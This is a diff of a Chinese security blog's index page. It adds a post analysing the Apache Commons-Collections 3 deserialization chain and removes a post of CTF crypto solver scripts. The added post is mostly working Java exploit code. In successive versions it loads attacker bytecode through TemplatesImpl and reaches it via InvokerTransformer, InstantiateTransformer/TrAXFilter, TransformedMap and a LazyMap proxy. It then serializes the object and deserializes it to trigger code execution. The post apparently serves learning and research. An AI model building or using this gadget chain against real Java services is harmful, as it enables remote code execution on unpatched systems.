@@ -172,6 +172,354 @@
         
 
 <div class="post">
+    <a href="/2023/08/09/CommonCollections3%E9%93%BE%E5%88%86%E6%9E%90/">
+        <h2 class="post-title">CommonCollections3链分析</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/8/9
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>先介绍一下<code>URLClassLoader</code><br><img src="https://img-blog.csdnimg.cn/e2bc26dffb3a4724bb733b6734f743ef.png" alt="在这里插入图片描述"></p>
+<p>URLClassLoader可以从传入的URL上加载任意类<br>且支持http协议<br><img src="https://img-blog.csdnimg.cn/a302b397909b406dbd57b79b2c17e90d.png" alt="在这里插入图片描述"><br>实际上类加载最关键的地方在<code>Classloader#definClass()</code><br>所以我们要去找有谁调用了该方法<br><img src="https://img-blog.csdnimg.cn/fa83d3155c9842ba9c1e711c76b6df64.png" alt="在这里插入图片描述"><br>在<code>TemplatesImpl</code>的内部类<code>TransletClassLoader#defineClass()</code>处调用<br>往前	<img src="https://img-blog.csdnimg.cn/de913eb93f314c17afed00688aa27699.png" alt="在这里插入图片描述"><br><code>TemplatesImpl#defineTransletClasses()</code><br>往前<br><img src="https://img-blog.csdnimg.cn/e7ff0bcf5af34ab99b3664a13606fbd3.png" alt="在这里插入图片描述"></p>
+<p><code>TemplatesImpl#getTransletInstance()</code><br>往前<br><img src="https://img-blog.csdnimg.cn/7a41dec804084641b0910042fc31092c.png" alt="在这里插入图片描述"><br><code>TemplatesImpl#newTransformer()</code><br>这个函数是public修饰的可以被外部修饰<br>我们先写一个demo测一下</p>
+<pre><code class="java">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+
+import javax.xml.transform.TransformerConfigurationException;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+
+public class CC3 &#123;
+    public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, TransformerConfigurationException, NoSuchFieldException &#123;
+
+        TemplatesImpl templates = new TemplatesImpl();
+        Class&lt;?&gt; clazz = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;);
+        Field name = clazz.getDeclaredField(&quot;_name&quot;);
+        Field bytecodes = clazz.getDeclaredField(&quot;_bytecodes&quot;);
+        Field tfactory = clazz.getDeclaredField(&quot;_tfactory&quot;);
+        name.setAccessible(true);
+        bytecodes.setAccessible(true);
+        tfactory.setAccessible(true);
+        name.set(templates,&quot;ss&quot;);
+        byte[] code = Files.readAllBytes(Paths.get(&quot;绝对路径&quot;));
+        byte[][] codes = &#123;code&#125;;
+        bytecodes.set(templates,codes);
+        tfactory.set(templates,new TransformerFactoryImpl());
+        templates.newTransformer();
+
+    &#125;
+    public static void serialize(Object obj) throws IOException &#123;
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    &#125;
+    public static Object unSerialize(String path) throws IOException, ClassNotFoundException &#123;
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path));
+        return ois.readObject();
+    &#125;
+&#125;
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/d26c072e9a71451eb952bd46e1992613.png" alt="在这里插入图片描述"></p>
+<p>注意Test类要继承<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>避免<code>TemplatesImpl#defineTransletClasses</code>抛空指针异常<br><img src="https://img-blog.csdnimg.cn/9c001550adf847b9a7f09057972667e1.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/37654ba545c84b55880c89d4466c3d8b.png" alt="在这里插入图片描述"><br>TemplatesImpl实现了Serializable接口<br>后面和cc1差不多<br>改改就能用了<br>先测一下确保没写错<img src="https://img-blog.csdnimg.cn/531a7a796af940d29cd3f4c3f34f6da6.png"></p>
+<pre><code class="java">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import javax.xml.transform.TransformerConfigurationException;
+import java.io.*;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.net.*;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC3 &#123;
+    public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, TransformerConfigurationException, NoSuchFieldException, URISyntaxException, NoSuchMethodException, InvocationTargetException &#123;
+
+        TemplatesImpl templates = new TemplatesImpl();
+        Class&lt;?&gt; clazz = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;);
+        Field name = clazz.getDeclaredField(&quot;_name&quot;);
+        Field bytecodes = clazz.getDeclaredField(&quot;_bytecodes&quot;);
+//        Field tfactory = clazz.getDeclaredField(&quot;_tfactory&quot;);
+        name.setAccessible(true);
+        bytecodes.setAccessible(true);
+//        tfactory.setAccessible(true);
+        name.set(templates,&quot;ss&quot;);
+        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\IDEA\\maventest\\CC3\\CC3\\target\\classes\\Test.class&quot;));
+        byte[][] codes = &#123;code&#125;;
+        bytecodes.set(templates,codes);
+//        tfactory.set(templates,new TransformerFactoryImpl());
+//        templates.newTransformer();
+
+        Transformer[] transformers = new Transformer[]&#123;
+                new ConstantTransformer(templates)
+                ,new InvokerTransformer(&quot;newTransformer&quot;,null,null)
+                &#125;;
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        HashMap&lt;String, Object&gt; hashMap = new HashMap&lt;&gt;();
+        hashMap.put(&quot;value&quot;,&quot;value&quot;);
+        Map&lt;Object,Object&gt; decoratedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
+
+        Constructor constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;)
+                .getDeclaredConstructor(Class.class, Map.class);
+        constructor.setAccessible(true);
+        Object obj = constructor.newInstance(Target.class,decoratedMap);
+//        serialize(obj);
+        unSerialize(&quot;ser.bin&quot;);
+    &#125;
+    public static void serialize(Object obj) throws IOException &#123;
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    &#125;
+    public static Object unSerialize(String path) throws IOException, ClassNotFoundException &#123;
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path));
+        return ois.readObject();
+    &#125;
+&#125;
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/8baa119b8cfd4131a0490a3d2e8f40ea.png" alt="在这里插入图片描述"><br>在ysoserial上是用的<code>InstantiateTransformer</code><br>那我们再来看看这个怎么实现<br><img src="https://img-blog.csdnimg.cn/ce4e154d5816485990cd7179b08cde39.png" alt="在这里插入图片描述"><br>TrAXFilter的构造方法中调了newTransformer<br>我们可以通过<code>InstantiateTransformer#transform()</code>来调构造方法</p>
+<pre><code class="java">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InstantiateTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import javax.xml.transform.Templates;
+import javax.xml.transform.TransformerConfigurationException;
+import java.io.*;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.net.*;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC3 &#123;
+    public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, TransformerConfigurationException, NoSuchFieldException, URISyntaxException, NoSuchMethodException, InvocationTargetException &#123;
+//        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]&#123;new URL(&quot;file://target\\classes\\Test.class&quot;)&#125;);
+//        Class&lt;?&gt; c = urlClassLoader.loadClass(&quot;Test&quot;);
+//        c.newInstance();
+
+
+        TemplatesImpl templates = new TemplatesImpl();
+        Class&lt;?&gt; clazz = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;);
+        Field name = clazz.getDeclaredField(&quot;_name&quot;);
+        Field bytecodes = clazz.getDeclaredField(&quot;_bytecodes&quot;);
+//        Field tfactory = clazz.getDeclaredField(&quot;_tfactory&quot;);
+        name.setAccessible(true);
+        bytecodes.setAccessible(true);
+//        tfactory.setAccessible(true);
+        name.set(templates,&quot;ss&quot;);
+        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\IDEA\\maventest\\CC3\\CC3\\target\\classes\\Test.class&quot;));
+        byte[][] codes = &#123;code&#125;;
+        bytecodes.set(templates,codes);
+//        tfactory.set(templates,new TransformerFactoryImpl());
+//        templates.newTransformer();
+
+//        Transformer[] transformers = new Transformer[]&#123;
+//                new ConstantTransformer(templates)
+//                ,new InvokerTransformer(&quot;newTransformer&quot;,null,null)
+//                &#125;;
+//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+//
+//        HashMap&lt;String, Object&gt; hashMap = new HashMap&lt;&gt;();
+//        hashMap.put(&quot;value&quot;,&quot;value&quot;);
+//        Map&lt;Object,Object&gt; decoratedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
+//
+//        Constructor constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;)
+//                .getDeclaredConstructor(Class.class, Map.class);
+//        constructor.setAccessible(true);
+//        Object obj = constructor.newInstance(Target.class,decoratedMap);
+
+        Transformer[] transformers = new Transformer[]&#123;
+                new ConstantTransformer(TrAXFilter.class)
+                ,new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)
+        &#125;;
+
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+
+                HashMap&lt;String, Object&gt; hashMap = new HashMap&lt;&gt;();
+        hashMap.put(&quot;value&quot;,&quot;value&quot;);
+        Map&lt;Object,Object&gt; decoratedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
+
+        Constructor constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;)
+                .getDeclaredConstructor(Class.class, Map.class);
+        constructor.setAccessible(true);
+        Object obj = constructor.newInstance(Target.class,decoratedMap);
+
+
+        serialize(obj);
+        unSerialize(&quot;ser.bin&quot;);
+    &#125;
+    public static void serialize(Object obj) throws IOException &#123;
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    &#125;
+    public static Object unSerialize(String path) throws IOException, ClassNotFoundException &#123;
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path));
+        return ois.readObject();
+    &#125;
+&#125;
+</code></pre>
+<p>最后再改成lazyMap的就行了<br><img src="https://img-blog.csdnimg.cn/f16e35938f3942118d735d2f9e0ba61f.png" alt="在这里插入图片描述"></p>
+<pre><code class="java">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InstantiateTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.map.TransformedMap;
+
+import javax.xml.transform.Templates;
+import javax.xml.transform.TransformerConfigurationException;
+import java.io.*;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Proxy;
+import java.net.*;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC3 &#123;
+    public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, TransformerConfigurationException, NoSuchFieldException, URISyntaxException, NoSuchMethodException, InvocationTargetException &#123;
+//        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]&#123;new URL(&quot;file://target\\classes\\Test.class&quot;)&#125;);
+//        Class&lt;?&gt; c = urlClassLoader.loadClass(&quot;Test&quot;);
+//        c.newInstance();
+
+
+        TemplatesImpl templates = new TemplatesImpl();
+        Class&lt;?&gt; clazz = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;);
+        Field name = clazz.getDeclaredField(&quot;_name&quot;);
+        Field bytecodes = clazz.getDeclaredField(&quot;_bytecodes&quot;);
+//        Field tfactory = clazz.getDeclaredField(&quot;_tfactory&quot;);
+        name.setAccessible(true);
+        bytecodes.setAccessible(true);
+//        tfactory.setAccessible(true);
+        name.set(templates,&quot;ss&quot;);
+        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\IDEA\\maventest\\CC3\\CC3\\target\\classes\\Test.class&quot;));
+        byte[][] codes = &#123;code&#125;;
+        bytecodes.set(templates,codes);
+//        tfactory.set(templates,new TransformerFactoryImpl());
+//        templates.newTransformer();
+
+//        Transformer[] transformers = new Transformer[]&#123;
+//                new ConstantTransformer(templates)
+//                ,new InvokerTransformer(&quot;newTransformer&quot;,null,null)
+//                &#125;;
+//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+//
+//        HashMap&lt;String, Object&gt; hashMap = new HashMap&lt;&gt;();
+//        hashMap.put(&quot;value&quot;,&quot;value&quot;);
+//        Map&lt;Object,Object&gt; decoratedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
+//
+//        Constructor constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;)
+//                .getDeclaredConstructor(Class.class, Map.class);
+//        constructor.setAccessible(true);
+//        Object obj = constructor.newInstance(Target.class,decoratedMap);
+
+        Transformer[] transformers = new Transformer[]&#123;
+                new ConstantTransformer(TrAXFilter.class)
+                ,new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)
+        &#125;;
+
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        Constructor annotationInvocationHandlerConstructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;)
+                .getDeclaredConstructor(Class.class, Map.class);
+        annotationInvocationHandlerConstructor.setAccessible(true);
+
+
+
+        HashMap&lt;String, Object&gt; hashMap = new HashMap&lt;&gt;();
+
+        LazyMap lzMap = (LazyMap) LazyMap.decorate(hashMap,chainedTransformer);
+        InvocationHandler lzInvocationHandler = (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class, lzMap);
+        Map proxyLazyMap = (Map) Proxy.newProxyInstance(lzMap.getClass().getClassLoader(), lzMap.getClass().getInterfaces(), lzInvocationHandler);
+
+        Object obj = annotationInvocationHandlerConstructor.newInstance(Override.class, proxyLazyMap);
+
+
+        serialize(obj);
+        unSerialize(&quot;ser.bin&quot;);
+    &#125;
+    public static void serialize(Object obj) throws IOException &#123;
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    &#125;
+    public static Object unSerialize(String path) throws IOException, ClassNotFoundException &#123;
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path));
+        return ois.readObject();
+    &#125;
+&#125;
+</code></pre>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #03a9f4">安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/java/" style="color: #00bcd4">java</a>
+        </span>
+        
+    </div>
+    <a href="/2023/08/09/CommonCollections3%E9%93%BE%E5%88%86%E6%9E%90/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
     <a href="/2023/08/07/hacksudo3%20%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/">
         <h2 class="post-title">hacksudo3 通关详解</h2>
     </a>
@@ -214,12 +562,12 @@
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
         </span>
         
     </div>
@@ -545,7 +893,7 @@ if(!isset($_GET[&#39;file&#39;])) &#123;
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
         </span>
         
         <span class="tag">
@@ -598,12 +946,12 @@ if(!isset($_GET[&#39;file&#39;])) &#123;
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00bcd4">安全</a>
         </span>
         
     </div>
@@ -746,7 +1094,7 @@ public class Main &#123;
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
         </span>
         
         <span class="tag">
@@ -756,7 +1104,7 @@ public class Main &#123;
         
         <span class="tag">
             
-            <a href="/tags/java/" style="color: #00a596">java</a>
+            <a href="/tags/java/" style="color: #ff7d73">java</a>
         </span>
         
     </div>
@@ -807,12 +1155,12 @@ chmod +x emergency
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #03a9f4">安全</a>
         </span>
         
     </div>
@@ -997,17 +1345,17 @@ public class App
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00a596">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/java/" style="color: #ff7d73">java</a>
+            <a href="/tags/java/" style="color: #ffa2c4">java</a>
         </span>
         
     </div>
@@ -1235,7 +1583,7 @@ echo urlencode(serialize($pop));
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #03a9f4">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00a596">安全</a>
         </span>
         
     </div>
@@ -1456,22 +1804,22 @@ echo urlencode(serialize($p)).&quot;\n&quot;;
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/python/" style="color: #ff7d73">python</a>
+            <a href="/tags/python/" style="color: #00bcd4">python</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00a596">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%89%8D%E7%AB%AF/" style="color: #03a9f4">前端</a>
+            <a href="/tags/%E5%89%8D%E7%AB%AF/" style="color: #00a596">前端</a>
         </span>
         
     </div>
@@ -1751,132 +2099,11 @@ print(long_to_bytes(m))
         
         <span class="tag">
             
-            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #00a596">数学建模</a>
+            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #00bcd4">数学建模</a>
         </span>
         
     </div>
     <a href="/2023/06/10/NSS%E5%91%A8%E5%B8%B8%E5%88%B7%E5%AF%86%E7%A0%81(3)/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2023/06/05/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%99%95%E8%A5%BF%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%20%E9%83%A8%E5%88%86crypto%E5%A4%8D%E7%8E%B0/">
-        <h2 class="post-title">第三届陕西省大学生网络安全技能大赛 部分crypto复现</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2023/6/5
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="奇怪的sar"><a href="#奇怪的sar" class="headerlink" title="奇怪的sar"></a>奇怪的sar</h1><p>lcg拿种子<br>爆破p的所有满足<code>p^q = seed</code>的可能然后求解<br>或者类似<code>第五空间signin</code>那题,不爆破所有可能(因为我爆破的脚本用的别人的,他用递归实现,1024位会超上限),只爆破低位<br><img src="https://img-blog.csdnimg.cn/ec3e4a87ca034b50af2fd58b28e8322c.png" alt="在这里插入图片描述"></p>
-<pre><code class="python">from Crypto.Util.number import *
-from tqdm import trange
-import gmpy2
-
-c = 14883053247652228283811442762780942186987432684268901119544211089991663825267989728286381980568977804079766160707988623895155236079459150322336701772385709429870215701045797411519212730389048862111088898917402253368572002593328131895422933030329446097639972123501482601377059155708292321789694103528266681104521268192526745361895856566384239849048923482217529011549596939269967690907738755747213669693953769070736092857407573675987242774763239531688324956444305397953424851627349331117467417542814921554060612622936755420459029769026126293588814831034143264949347763031994934813475762839410192390466491651507733968227
-e = 65537
-n =  24044063028844014127418595700558729326190738802687551098858513077613750188240082663594575453404975706225242363463089392757425008423696150244560748490108425645064339883915929498539109384801415313004805586193044292137299902797522618277016789979196782551492020031695781792205215671106103568559626617762521687128199445018651010056934305055040748892733145467040663073395258760159451903432330506383025685265502086582538667772105057401245864822281535425692919273252955571196166824113519446568745718898654447958192533288063735350717599092500158028352667339959012630051251024677881674246253876293205648190626145653304572328397
-
-seed = 39428646082513135314545544161912595458975375891528176714825766497155482031976852156313956476772023258684487799640179241987139554034654104867011313090105438798561154654679825702410748780286094326639330840289843154525176685892323447168072417654823748596238888125898914210332775882916911771786984574407163323116
-
-def findp(p,plist):
-    l=len(p)
-    if l==600:
-        plist.append(int(p,2))
-    else:
-        pp=int(p,2)
-        qq=(seed^^pp)%2**l
-        if pp*qq%2**l==n%2**l:
-            findp(&#39;1&#39;+p,plist)
-            findp(&#39;0&#39;+p,plist)
-
-plist=[]
-findp(&#39;1&#39;,plist)
-print(plist)
-
-
-
-for i in trange(len(plist)):
-    PR.&lt;x&gt; = PolynomialRing(Zmod(n))
-    f = x*2^600 + plist[i]
-    f = f.monic()
-    r = f.small_roots(X=2^424, beta=0.4)
-    if r:
-        p = int(plist[i]+r[0]* 2^600)
-        if n%p == 0:
-            break
-
-q = n // p
-d = gmpy2.invert(e, (p-1)*(q-1))
-print(long_to_bytes(power_mod(c, d, n)))
-</code></pre>
-<h1 id="M3"><a href="#M3" class="headerlink" title="M3"></a>M3</h1><pre><code class="c">from Crypto.Util.number import *
-from rsaAttack import rsaATTACK
-from itertools import product
-from string import digits
-import gmpy2
-
-c = 35771468551700967499031290145813826705314774357494021918317304230766070868171631520643911378972522363861624359732252684003796428570328730483253546904382041
-n = 142672086626283587048017713116658568907056287246536918432205313755474498483915485435443731126588499776739329317569276048159601495493064346081295993762052633
-e = 65537
-
-pqh = str(n)[:19]
-pql = str(n)[-18:]
-
-# for i,j in product(digits,repeat=2):
-#     pq = pqh + i + j + pql
-#     tp = rsaATTACK.factor_n(int(pq))
-#     if tp and len(tp) == 2 and tp[0].bit_length() == 64:
-#         p, q = tp
-#         break
-# print(p,q)
-p = 9937378783676979077 
-q = 14357114660923972229
-P = int(str(p) + str(q)) #128 
-Q = int(str(q) + str(p)) #128 
-PP = int(str(P) + str(Q)) #256 
-QQ = int(str(Q) + str(P)) #256 
-
-d = gmpy2.invert(e,(PP-1)*(QQ-1))
-print(long_to_bytes(pow(c,d,n)))
-</code></pre>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #ffa2c4">数学建模</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00a596">安全</a>
-        </span>
-        
-    </div>
-    <a href="/2023/06/05/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%99%95%E8%A5%BF%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%20%E9%83%A8%E5%88%86crypto%E5%A4%8D%E7%8E%B0/" class="go-post">阅读全文</a>
 </div>
 
 
